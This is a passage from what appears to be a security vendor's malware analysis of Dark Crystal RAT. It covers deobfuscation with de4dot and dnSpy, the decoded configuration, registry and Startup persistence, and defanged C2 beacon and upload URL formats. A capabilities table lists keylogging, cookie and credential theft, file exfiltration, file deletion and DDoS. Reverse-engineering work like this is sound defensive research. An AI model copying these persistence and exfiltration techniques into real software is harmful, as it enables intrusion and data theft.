    href="https://app.any.run/tasks/01a715ca-6a34-4350-b3ba-d1daae1e3d16/">public
    sandbox run</a> that included the same sample. Other public
  reporting <a
    href="https://tccontre.blogspot.com/2019/10/dcrat-malware-evades-sandbox-that-use.html">described
    DCRat, but actually analyzed the daaca.exe Plurox component</a>
  bundled along with DCRat in the initial sample.</p>
 <p>Satisfied that dfsds.exe was a RAT lacking detailed public
  reporting, we decided to perform a deeper analysis.</p>
 <h4>Analyzing Dark Crystal RAT</h4>
 <h5>Initial Analysis</h5>
 <p>Shifting aside from our sandbox for a moment, we performed static
  analysis on dfsds.exe. We chose to begin static analysis using CFF
  Explorer, a good tool for opening a PE file and breaking down its
  sections into a form that is easy to view. Having viewed dfsds.exe in
  CFF Explorer, as shown in Figure 2, the utility showed us that it is a
  .NET executable. This meant we could take a much different path to
  analyzing it than we would on a native C or C++ sample. Techniques we
  might have otherwise used to start narrowing down a native sample’s
  functionality, such as looking at what DLLs it imports and what
  functions from those DLLs that it uses, yielded no useful results for
  this .NET sample. As shown in Figure 3, dfsds.exe imports only the
  function <span class="code">_CorExeMain</span> from mscoree.dll. We
  could have opened dfsds.exe in IDA Pro, but IDA Pro is usually not the
  most effective way of analyzing .NET samples; in fact, the free
  version of IDA Pro cannot handle .NET Common Language Infrastructure
  (CLI) intermediate code.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure2.png" alt="" />
  <span class="type-XS">
    <br /> Figure 2: CFF Explorer shows that dfsds.exe is a .NET executable.</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure3.png" alt="" />
  <span class="type-XS">
    <br /> Figure 3: The import table for dfsds.exe is not useful as it
    contains only one function.</span></p>
 <p>Instead of using a disassembler like IDA Pro on dfsds.exe, we used a
  .NET decompiler. Luckily for the reverse engineer, decompilers operate
  at a higher level and often produce a close approximation of the
  original C# code. dnSpy is a great .NET decompiler. dnSpy’s interface
  displays a hierarchy of the sample’s namespaces and classes in the
  Assembly Explorer and shows code for the selected class on the right.
  Upon opening dfsds.exe, dnSpy told us that the sample’s original name
  at link time was DCRatBuild.exe, and that its entry point is at <span
  class="code">&lt;PrivateImplementationDetails&gt;{63E52738-38EE-4EC2-999E-1DC99F74E08C}.Main</span>,
  shown in Figure 4. When we browsed to the Main method using the
  Assembly Explorer, we found C#-like code representing that method in
  Figure 5. Wherever dnSpy displays a call to another method in the
  code, it is possible to click on the target method name to go to it
  and view its code. By right-clicking on an identifier in the code, and
  clicking Analyze in the context menu, we caused dnSpy to look for all
  occurrences where the identifier is used, similar to using
  cross-references in IDA Pro.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: dnSpy can help us locate the
    sample's entry point</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: dnSpy decompiles the Main
    method into C#-like code</span></p>
 <p>We went to the <span class="code">SchemaServerManager.Main</span>
  method that is called from the entry point method, and observed that
  it makes many calls to <span
  class="code">ExporterServerManager.InstantiateIndexer</span> with
  different integer arguments, as shown in Figure 6. We browsed to the
    <span class="code">ExporterServerManager.InstantiateIndexer</span>
  method, and found that it is structured as a giant switch statement
  with many goto statements and labels; Figure 7 shows an excerpt. This
  does not look like typical dnSpy output, as dnSpy often reconstructs a
  close approximation of the original C# code, albeit with the loss of
  comments and local variable names. This code structure, combined with
  the fact that the code refers to the <span
  class="code">CipherMode.CBC</span> constant, led us to believe that
    <span class="code">ExporterServerManager.InstantiateIndexer</span>
  may be a decryption or deobfuscation routine. Therefore, dfsds.exe is
  likely obfuscated. Luckily, .NET developers often use obfuscation
  tools that are somewhat reversible through automated means.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: SchemaServerManager.Main makes
    many calls to ExporterServerManager.InstantiateIndexer</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure7.png" alt="" />
  <br /> <span class="type-XS">Figure 7:
    ExporterServerManager.InstantiateIndexer looks like it may be a
    deobfuscation routine</span></p>
 <h5>Deobfuscation</h5>
 <p>De4dot is a .NET deobfuscator that knows how to undo many types of
  obfuscations. Running de4dot -d (for detect) on dfsds.exe (Figure 8)
  informed us that .NET Reactor was used to obfuscate it.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">&gt; de4dot -d dfsds.exe</span></p> <p>
          <span class="code">de4dot v3.1.41592.3405 Copyright (C)
            2011-2015 de4dot@gmail.com<br />  Latest version and source
            code: https://github.com/0xd4d/de4dot</span></p> <p>
          <span class="code">Detected .NET Reactor
        (C:\...\dfsds.exe)</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: dfsds.exe is obfuscated with .NET Reactor</span></p>
 <p>After confirming that de4dot can deobfuscate dfsds.exe, we ran it
  again to deobfuscate the sample into the file dfsds_deob.exe (Figure 9).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">&gt; de4dot -f dfsds.exe -o
        dfsds_deob.exe</span></p> <p>
          <span class="code">de4dot v3.1.41592.3405 Copyright (C)
            2011-2015 de4dot@gmail.com<br />  Latest version and source
            code: https://github.com/0xd4d/de4dot</span></p> <p>
          <span class="code">Detected .NET Reactor
            (C:\Users\user\Desktop\intelfirst\dfsds.exe)<br />  Cleaning
            C:\Users\user\Desktop\intelfirst\dfsds.exe<br />  Renaming
            all obfuscated symbols<br />  Saving
        C:\Users\user\Desktop\intelfirst\dfsds_deob.exe</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: de4dot successfully deobfuscates dfsds.exe</span></p>
 <p>After deobfuscating dfsds.exe, we ran dnSpy again on the resulting
  dfsds_deob.exe. When we decompiled <span
  class="code">SchemaServerManager.Main</span> again, the results were
  much different, as shown in Figure 10. Contrasting the new output with
  the obfuscated version shown previously in Figure 6, we found the
  deobfuscated code much more readable. In the deobfuscated version, all
  the calls to <span
  class="code">ExporterServerManager.InstantiateIndexer</span> were
  removed; as suspected, it was apparently a string decoding routine. In
  contrast, the class names shown in the Assembly Explorer did not
  change; the obfuscator must have irrecoverably replaced the original
  class names with meaningless ones obtained from a standard list. Next,
  we noted that ten lines in Figure 10 hold base64-encoded data. Once
  the sample was successfully deobfuscated, it was time to move on to
  extracting its configuration and to follow the sample’s code path to
  its persistence capabilities and initial beacon.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Deobfuscating dfsds.exe shows
    that the method begins with some path manipulation and then accesses
    Base64-encoded data</span></p>
 <h5>Configuration, Persistence and Initial Beacon</h5>
 <p>Recall that in Figure 10 we found that the method <span
  class="code">SchemaServerManager.Main</span> has a local variable
  containing Base64-encoded data; decoding that data revealed what it
  contains. Figure 11 shows the decoded configuration (with C2 endpoint
  URLs de-fanged):</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">&gt; echo
            TUhvc3Q6aHR0cDovL2RvbWFsby5vbmxpbmUva3NlemJseGx2b3Uza2NtYnE4bDdoZjNmNGN5NXhnZW<br />
            80dWRsYTkxZHVldTNxYTU0LzQ2a3FianZ5a2x1bnAxejU2dHh6a2hlbjdnamNpM2N5eDhnZ2twdHgy<br />
            NWk3NG1vNm15cXB4OWtsdnYzL2FrY2lpMjM5bXl6b24weHdqbHhxbm4zYjM0dyxCSG9zdDpodHRwOi<br />
            8vZG9tYWxvLm9ubGluZS9rc2V6Ymx4bHZvdTNrY21icThsN2hmM2Y0Y3k1eGdlbzR1ZGxhOTFkdWV1<br />
            M3FhNTQvNDZrcWJqdnlrbHVucDF6NTZ0eHpraGVuN2dqY2kzY3l4OGdna3B0eDI1aTc0bW82bXlxcH<br />
            g5a2x2djMvYWtjaWkyMzlteXpvbjB4d2pseHFubjNiMzR3LE1YOkRDUl9NVVRFWC13TGNzOG8xTlZF<br />
            VXRYeEo5bjl5ZixUQUc6VU5ERUY= | base64 -d</span></p> <p>
          <span
            class="code">MHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/<br />
            46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjl<br />
            xqnn3b34w,BHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91<br />
            dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239<br />
        myzon0xwjlxqnn3b34w,MX:DCR_MUTEX-wLcs8o1NVEUtXxJ9n9yf,TAG:UNDEF</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: Decoding the base64 data in
    SchemaServerManager.Main reveals a configuration string</span></p>
 <p>Figure 11 shows that the data decoded to a configuration string
  containing four values: MHost, BHost, MX, and TAG. We analyzed the
  code that parses this string and found that MHost and BHost were used
  as its main and backup command and control (C2) endpoints. Observe
  that the MHost and BHost values in Figure 11 are identical, so this
  sample did not have a backup C2 endpoint.</p>
 <p>In dnSpy it is possible to give classes and methods meaningful names
  just as it is possible to name identifiers in IDA Pro. For example,
  the method <span class="code">SchemaServerManager.StopCustomer</span>
  picks the name of a random running process. By right-clicking the
    <span class="code">StopCustomer</span> identifier and choosing Edit
  Method, it is possible to change the method name to <span
  class="code">PickRandomProcessName</span>, as shown in Figure 12.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: Assigning meaningful names to
    methods makes it easier to keep analyzing the program</span></p>
 <p>Continuing to analyze the <span
  class="code">SchemaServerManager.Main</span> method revealed that the
  sample persists across reboots. The persistence algorithm can be
  summarized as follows:</p>
 <ol> <li>The malware picks the name of a random running process, and
    then copies itself to <span class="code">%APPDATA%</span> and <span
    class="code">C:\</span>. For example, if svchost.exe is selected,
    then the malware copies itself to <span
    class="code">%APPDATA%\svchost.exe</span> and <span
  class="code">C:\svchost.exe</span>.</li> <li>The malware creates a
    shortcut <span class="code">%APPDATA%\dotNET.lnk</span> pointing to
    the copy of the malware under <span
  class="code">%APPDATA%</span>.</li> <li>The malware creates a shortcut
    named dotNET.lnk in the logged-on user’s Startup folder pointing to
      <span class="code">%APPDATA%\dotNET.lnk</span>.</li> <li>The
    malware creates a shortcut <span class="code">C:\Sysdll32.lnk</span>
    pointing to the copy of the malware under <span
  class="code">C:\</span>.</li> <li>The malware creates a shortcut named
    Sysdll32.lnk in the logged-on user’s Startup folder pointing to
      <span class="code">C:\Sysdll32.lnk</span>.</li> <li>The malware
    creates the registry value <span
    class="code">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\scrss</span>
    pointing to <span class="code">%APPDATA%\dotNET.lnk</span>.</li>
    <li>The malware creates the registry value <span
    class="code">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Wininit</span>
    pointing to <span class="code">C:\Sysdll32.lnk</span>.</li> </ol>
 <p>After its persistence steps, the malware checks for multiple
  instances of the malware:</p>
 <ol> <li>The malware sleeps for a random interval between 5 and 7
  seconds.</li> <li>The malware takes the MD5 hash of the
    still-base64-encoded configuration string, and creates the mutex
    whose name is the hexadecimal representation of that hash. For this
    sample, the malware creates the mutex <span
    class="code">bc2dc004028c4f0303f5e49984983352</span>. If this fails
    because another instance is running, the malware exits.</li> </ol>
 <p>The malware then beacons, which also allows it to determine whether
  to use the main host (MHost) or backup host (BHost). To do so, the
  malware constructs a beacon URL based on the MHost URL, makes a
  request to the beacon URL, and then checks to see if the server
  responds with the HTTP response body “ok.” If the server does not send
  this response, then the malware unconditionally uses the BHost; this
  code is shown in Figure 13. Note that since this sample has the same
  MHost and BHost value (from Figure 11), the malware uses the same C2
  endpoint regardless of whether the check succeeds or fails.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: The malware makes an HTTP
    request based on the MHost URL to determine whether to use the MHost
    or BHost</span></p>
 <p>The full algorithm to obtain the beacon URL is as follows:</p>
 <ol> <li>Obtain the MHost URL, i.e., <span
      class="code">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54<br />
      /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239my<br />
  zon0xwjlxqnn3b34w</span>.</li> <li>Calculate the SHA1 hash of the full
    MHost URL, i.e., 56743785cf97084d3a49a8bf0956f2c744a4a3e0.</li>
    <li>Remove the last path component from the MHost URL, and then
    append the SHA1 hash from above, and ?data=active. The full beacon
    URL is therefore <span
      class="code">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54<br />
      /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf<br />
  97084d3a49a8bf0956f2c744a4a3e0.php?data=active</span>.</li> </ol>
 <p>After beaconing the malware proceeds to send and receive messages
  with the configured C2.</p>
 <h3>Messages and Capabilities</h3>
 <p>After performing static analysis of dfsds.exe to determine how it
  selects the C2 endpoint and confirming the C2 endpoint URL, we shifted
  to dynamic analysis in order to collect sample C2 traffic and make it
  easier to understand the code that generates and accepts C2 messages.
  Luckily for our analysis, the malware continues to generate requests
  to the C2 endpoint even if the server does not send a valid response.
  To listen for and intercept requests to the C2 endpoint
  (domalo[.]online) without allowing the malware Internet access, we
  used <a href="https://github.com/fireeye/flare-fakenet-ng">FLARE’s
    FakeNet-NG tool</a>. Figure 14 shows some of the C2 requests that
  the malware made being captured by FakeNet-NG.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: FakeNet-NG can capture the
    malware's HTTP requests to the C2 endpoint</span></p>
 <p>By comparing the messages generated by the malware and captured in
  FakeNet-NG with the malware’s decompiled code, we determined its
  message format and types. Observe that the last HTTP request visible
  in Figure 14 contains a list of running processes. By tracing through
  the decompiled code, we found that the method <span
  class="code">SchemaServerManager.ObserverWatcher.NewMerchant</span>
  generated this message. We renamed this method to taskThread and
  assigned meaningful names to the other methods it calls; the resulting
  code for this method appears in Figure 15.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure15.png" alt="" />
  <br /> <span class="type-XS">Figure 15: The method that generates the
    list of running processes and sends it to the C2 endpoint</span></p>
 <p>By analyzing the code further, we identified the components of the
  URLs that the malware used to send data to the C2 endpoint, and how
  they are constructed.</p>
 <p>
  <i>Beacons</i></p>
 <p>The first type of URL is a beacon, sent only once when the malware
  starts up. For this sample, the beacon URL was always
  hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzk<br />
  hen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/&lt;hash&gt;.php?data=active,
  where &lt;hash&gt; is the SHA1 hash of the MHost URL, as described earlier.</p>
 <p>
  <i>GET requests, format 1</i></p>
 <p>When the malware needs to send data to or receive data from the C2,
  it sends a message. The first type of message, which we denote as
  “format 1,” is a GET request to URLs of the form <span
    class="code">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br />
    jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br />
    3b34w/<i>&lt;hash&gt;</i>.php?
  type=__ds_setdata&amp;__ds_setdata_user=<i>&lt;user_hash&gt;</i>&amp;__ds_setdata_ext=<i>&lt;message_hash&gt;</i>&amp;__ds_setdata_data=<i>&lt;message&gt;</i></span>, where:</p>
 <ul> <li>
    <i>
      <span class="code">&lt;hash&gt;</span></i> is <span
    class="code">MD5(SHA1(MHost))</span>, which for this sample, is
      <span class="code">212bad81b4208a2b412dfca05f1d9fa7</span>.</li> <li>
    <i>
      <span class="code">&lt;user_hash&gt;</span></i> is a unique
    identifier for the machine on which the malware is running. It is
    always calculated as <span class="code">SHA1(OS_version +
      machine_name + user_name)</span> as provided by the .NET
    System.Environment class.</li> <li>
    <i>
      <span class="code">&lt;message_hash&gt;</span></i> identifies what
    kind of message the malware is sending to the C2 endpoint. The <span
    class="code">&lt;message_hash&gt;</span> is calculated as <span
      class="code">MD5(&lt;message_type&gt; + &lt;user_hash&gt;)</span>,
    where <span class="code">&lt;message_type&gt;</span> is a short
    keyword identifying the type of message, and <span
    class="code">&lt;user_hash&gt;</span> is as calculated above.<ul>
        <li>Values for &lt;message_type&gt; exist for each command that
        the malware supports; for possible values, see the “msgs”
        variable in the code sample shown in Figure 19.</li> <li>Observe
        that this makes it difficult to observe the message type
        visually from log traffic, or to write a static network
        signature for the message type, since it varies for every
        machine due to the inclusion of the <span
      class="code">&lt;user_hash&gt;</span>.</li> <li>One type of
        message uses the value u instead of a hash for <span
      class="code">&lt;message_hash&gt;</span>.</li> </ul> </li> <li>
    <i>
      <span class="code">&lt;message&gt;</span></i> is the message data,
    which is not obscured in any way.</li> </ul>
 <p>The other type of ordinary message is a <span
  class="code">getdata</span> message. These are GET requests to URLs of
  the form <span
    class="code">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br />
    jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br />
    3b34w/<i>&lt;hash&gt;</i>.php?
  type=__ds_getdata&amp;__ds_getdata_user=<i>&lt;user_hash&gt;</i>&amp;__ds_getdata_ext=<i>&lt;message_hash&gt;</i>&amp;__ds_getdata_key=<i>&lt;key&gt;</i></span>, where:</p>
 <ul> <li>
    <i>
      <span class="code">&lt;hash&gt;</span></i> and <i>
      <span class="code">&lt;user_hash&gt;</span></i> are calculated as
    described above for getdata messages.</li> <li>
    <i>
      <span class="code">&lt;message_hash&gt;</span></i> is also
    calculated as described above for getdata messages, but describes
    the type of message the malware is expecting to receive in the
    server’s response.</li> <li>
    <i>
      <span class="code">&lt;key&gt;</span></i> is <span
  class="code">MD5(&lt;user_hash&gt;)</span>.</li> </ul>
 <p>The server is expected to respond to a <span
  class="code">getdata</span> message with an appropriate response for
  the type of message specified by <span class="code">&lt;message_hash&gt;</span>.</p>
 <p>
  <i>GET requests, format 2</i></p>
 <p>A few types of messages from the malware to the C2 use a different
  format, which we denote as “format 2.” These messages are GET requests
  of the form <span class="code">hxxp://domalo[.]online
    /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gj<br />
      ci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/<i>&lt;user_hash&gt;</i>.<i>&lt;mes<br />
  sage_hash&gt;</i></span>, where:</p>
 <ul> <li>
    <i>
      <span class="code">&lt;user_hash&gt;</span></i> is calculated as
    described above for getdata messages.</li> <li>
    <i>
      <span class="code">&lt;message_hash&gt;</span></i> is also
    calculated as described above for getdata messages, but describes
    the type of message the malware is expecting to receive in the
    server’s response. <span class="code">&lt;message_hash&gt;</span>
    may also be the string <span class="code">comm</span>.</li> </ul>
 <p>Table 1 shows possible <span
  class="code">&lt;message_types&gt;</span> that may be incorporated
  into <span class="code">&lt;message_hash&gt;</span> as part of format
  2 messages to instruct the server which type of response is desired.
  In contrast to format 1 messages, format 2 messages are only used for
  a handful of <span class="code">&lt;message_type&gt;</span> values.</p>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="174" valign="top"><p>
          <b>&lt;message_type&gt;</b></p> </td> <td width="449" valign="top"><p>
          <b>Response desired</b></p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>s_comm</p> </td> <td width="449"
          valign="top"><p>The server sends a non-empty response if a
          screenshot request is pending</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>m_comm</p> </td> <td width="449"
          valign="top"><p>The server sends a non-empty response if a
          microphone request is pending</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>RDK</p> </td> <td width="449"
          valign="top"><p>The server responds directly with keystrokes
          to replay</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>comm</p> </td> <td width="449"
          valign="top"><p>The server responds directly with other types
          of tasking</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Message types when the malware uses a
    special message to request tasking from the server</span></p>
 <p>
  <i>POST requests</i></p>
 <p>When the malware needs to upload large files, it makes a POST
  request. These POST requests are sent to <span
    class="code">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br />
    jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br />
  3b34w/&lt;hash&gt;.php</span>, with the following parameters in the
  POST data:</p>
 <ul> <li>
    <i>name</i> is <span class="code">&lt;user_hash&gt; + &quot;.&quot;
      + &lt;message_type&gt;</span>, where <span
    class="code">&lt;user_hash&gt;</span> is calculated as described
    above and <span class="code">&lt;message_type&gt;</span> is the type
    of data being uploaded.</li> <li>
    <i>upload</i> is a file with the data being sent to the server.</li> </ul>
 <p>Table 2 shows possible <span
  class="code">&lt;message_type&gt;</span> values along with the type of
  file being uploaded.</p>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>&lt;message_type&gt;</p> </td> <td
        width="312" valign="top"><p>Type of File</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>jpg</p> </td> <td width="312"
        valign="top"><p>Screenshot</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>zipstealerlog</p> </td> <td
        width="312" valign="top"><p>Cookie stealer log</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>wav</p> </td> <td width="312"
          valign="top"><p>Microphone recording</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>file</p> </td> <td width="312"
          valign="top"><p>Uploaded file</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>bmp</p> </td> <td width="312"
          valign="top"><p>Webcam image</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>RD.jpg</p> </td> <td width="312"
          valign="top"><p>Remote control screenshot</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: Message types when files are uploaded
    to the server</span></p>
 <p>
  <i>Capabilities</i></p>
 <p>By analyzing the code that handles the responses to the <span
  class="code">comm</span> message (format 2), it was possible for us to
  inventory the malware’s capabilities. Table 3 shows the keywords used
  in responses along with the description of each capability.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="630"> <tbody>
    <tr>
      <td width="132" valign="top"><p>
          <b>Keyword</b></p> </td> <td width="498" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>shell</p> </td> <td width="498"
          valign="top"><p>Execute a shell command</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>deleteall</p> </td> <td
        width="498" valign="top"><p>Recursively delete all files from
          C:, D:, F:, and G:</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>closecd</p> </td> <td width="498"
          valign="top"><p>Close the CD-ROM drive door</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>setwallpaper</p> </td> <td
        width="498" valign="top"><p>Change the background wallpaper</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>ddos</p> </td> <td width="498"
          valign="top"><p>Send TCP and UDP packets to a given host or IP
        address</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>logoff</p> </td> <td width="498"
          valign="top"><p>Log off the current user</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>keyboardrecorder</p> </td> <td
        width="498" valign="top"><p>Replay keystrokes as if the user had
          typed them</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_newfolder</p> </td> <td
        width="498" valign="top"><p>Create a new folder</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_rename</p> </td> <td
        width="498" valign="top"><p>Rename or move a file</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>desktopHide</p> </td> <td
        width="498" valign="top"><p>Hide desktop icons</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>keyloggerstart</p> </td> <td
        width="498" valign="top"><p>Start logging keystrokes</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>exec_cs_code</p> </td> <td
        width="498" valign="top"><p>Compile and execute C# code</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>msgbox</p> </td> <td width="498"
          valign="top"><p>Open a Windows MessageBox</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_upload</p> </td> <td
        width="498" valign="top"><p>Transfer a file from the C2 to the
        client</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>rdp</p> </td> <td width="498"
          valign="top"><p>Re-spawn the malware running as an
        administrator</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_zip</p> </td> <td width="498"
          valign="top"><p>Build a ZIP file from a directory tree and
          transfer it from the client to the C2</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>webcam</p> </td> <td width="498"
          valign="top"><p>Take a webcam picture</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_unzip</p> </td> <td width="498"
          valign="top"><p>Unzip a ZIP file to a given path on the
        client</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>keyloggerstop</p> </td> <td
        width="498" valign="top"><p>Stop logging keystrokes</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_drives</p> </td> <td
        width="498" valign="top"><p>Enumerate drive letters</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>cookiestealer</p> </td> <td
        width="498" valign="top"><p>Transfer cookies and
          browser/FileZilla saved credentials to the C2</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_delete</p> </td> <td
        width="498" valign="top"><p>Recursively delete a given
        directory</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>dismon</p> </td> <td width="498"
          valign="top"><p>Hide desktop icons and taskbar</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_uploadu</p> </td> <td
        width="498" valign="top"><p>Transfer a file from the C2 to the
        client</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>taskstart</p> </td> <td
        width="498" valign="top"><p>Start a process</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>cleardesktop</p> </td> <td
        width="498" valign="top"><p>Rotate screen</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>lcmd</p> </td> <td width="498"
          valign="top"><p>Run shell command and send standard output
          back to C2</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>taskbarShow</p> </td> <td
        width="498" valign="top"><p>Show taskbar</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>clipboard</p> </td> <td
        width="498" valign="top"><p>Set clipboard contents</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>cookiestealer_file</p> </td> <td
        width="498" valign="top"><p>Save cookies and credentials to a
          local file</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>newuserpass</p> </td> <td
        width="498" valign="top"><p>Create a new local user account</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>beep</p> </td> <td width="498"
          valign="top"><p>Beep for set frequency and duration</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>speak</p> </td> <td width="498"
          valign="top"><p>Use speech synthesizer to speak text</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>openchat</p> </td> <td width="498"
          valign="top"><p>Open chat window</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>taskbarHide</p> </td> <td
        width="498" valign="top"><p>Hide the taskbar</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>RDStart</p> </td> <td width="498"
          valign="top"><p>Start remote control over user’s desktop</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>closechat</p> </td> <td
        width="498" valign="top"><p>Close chat window</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>RDStop</p> </td> <td width="498"
          valign="top"><p>Stop remote control over user’s desktop</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_opendir</p> </td> <td
        width="498" valign="top"><p>List directory contents</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>uninstall</p> </td> <td
        width="498" valign="top"><p>Remove the malware from the
        client</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>taskkill</p> </td> <td width="498"
          valign="top"><p>Kill a process</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>forkbomb</p> </td> <td width="498"
          valign="top"><p>Endlessly spawn instances of cmd.exe</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>fm_get</p> </td> <td width="498"
          valign="top"><p>Transfer a file from the client to the C2</p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>desktopShow</p> </td> <td
        width="498" valign="top"><p>Show desktop icons</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Clipboardget</p> </td> <td
        width="498" valign="top"><p>Transfer clipboard contents to
        C2</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>playaudiourl</p> </td> <td
